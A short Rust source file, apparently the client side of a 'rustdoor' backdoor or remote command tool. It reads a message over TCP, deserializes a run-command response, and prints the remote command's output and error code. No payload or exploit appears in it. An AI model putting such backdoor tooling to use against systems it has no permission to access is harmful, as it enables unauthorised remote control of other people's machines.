use std::io::{Error};
use std::net::{TcpStream};



use rustdoor::communication::messages::{
    Message, MessageType, MessageTypes, RunCommandRequest, RunCommandResponse,
    MESSAGE_HEADER_LENGTH,
};
use rustdoor::communication::server::get_message;



fn handle_response(message: Message) {
    println!("Response got: {:?}", message);
    if message.message_type == MessageTypes::RunCommandResponse as u8 {
        let response: RunCommandResponse =
            ron::de::from_bytes(&message.serialized_message).unwrap();
        println!("Output: {:?} ", &response.output);
        println!("Error code: {:?}", response.error_code);
    }
}

pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
    match get_message(&stream) {
        Ok(message) => {
            handle_response(message);
        }
        Err(e) => {
            println!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    }
    Ok(())
}
